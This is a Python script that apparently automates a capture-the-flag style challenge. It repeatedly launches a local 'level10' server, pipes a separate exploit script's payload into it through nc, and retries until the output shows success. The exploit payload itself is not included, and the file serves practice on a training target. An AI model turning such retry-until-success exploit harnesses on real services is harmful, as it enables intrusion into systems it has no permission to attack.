import os
import subprocess
import time
import signal

# Temporary file to capture server output
output_file = "level10_result"

def run_exploit():
    print("\nStarting attempts...")
    msg = ""
# Ensure the output file does not exist before starting
    while True:
        if os.path.exists(output_file):
            os.remove(output_file)

        with open(output_file, "w") as f:
            f.write("")
# Start the server
        print("\nStarting Server:")
        server_command = ["/var/challenge/level10/10", "-p", "3784"]
        server_process = subprocess.Popen(server_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, env={})
        server_pid = server_process.pid
        print(f" - Server PID: {server_pid}")

        start_time = time.time()
        timeout = 10
        # Check if the server writes to the file
        while True:
            if os.path.exists(output_file):
                with open(output_file, "r") as f:
                    if "Starting server on port" in f.read():
                        break
            if time.time() - start_time > timeout:
                print("Server initialization timeout!")
                break
            time.sleep(0.1)
# Remove output file to capture fresh data
        if os.path.exists(output_file):
            os.remove(output_file)

        print("\nSending payload to server:")
        with open(output_file, "w") as f:
            f.write("")
# Run the exploit script
        try:
            exploit_command = ["python", "level10.py"]
            with subprocess.Popen(
                exploit_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE
            ) as exploit_process:
                with subprocess.Popen(
                    ["nc", "localhost", "3784"],
                    stdin=exploit_process.stdout,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                ) as nc_process:
                    output, _ = nc_process.communicate(timeout=6)
                    with open(output_file, "wb") as f:
                        f.write(output)
# Check if the exploit was successful
            if os.path.exists(output_file):
                with open(output_file, "r") as f:
                    if "lev10" in f.read().lower():
                        print("\nSuccessfully executed l33t!")
                        break

        except subprocess.TimeoutExpired:
            pass
# Ensure the server process is killed
        finally:
            os.kill(server_pid, signal.SIGKILL)

        print("\n============================== " + msg)
        msg = "Retrying..."

    print("Done.")

if __name__ == "__main__":
    try:
        run_exploit()
    except KeyboardInterrupt:
        print("Script interrupted by user. Exiting...")
        exit(0)

